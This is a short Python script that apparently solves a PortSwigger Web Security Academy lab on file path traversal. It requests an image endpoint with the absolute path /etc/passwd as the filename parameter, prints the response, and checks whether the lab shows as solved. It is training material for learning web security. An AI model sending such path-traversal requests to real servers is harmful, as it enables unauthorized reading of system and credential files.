#!/usr/bin/env python

'''This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
'''
import requests


lab_id = '0a8e00e0032b893a81174383004f00d7' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/"  


payload = 'image?filename=/etc/passwd' # directory traversal payload, exploit the image endpoint by using the 'filename' parameter

r1 = requests.get(uri + payload)
print(r1.text)

# reload page to trigger success flag
r2 = requests.get(uri)
if 'Solved' in r2.text:
    print('solved')
else:
    print('nope')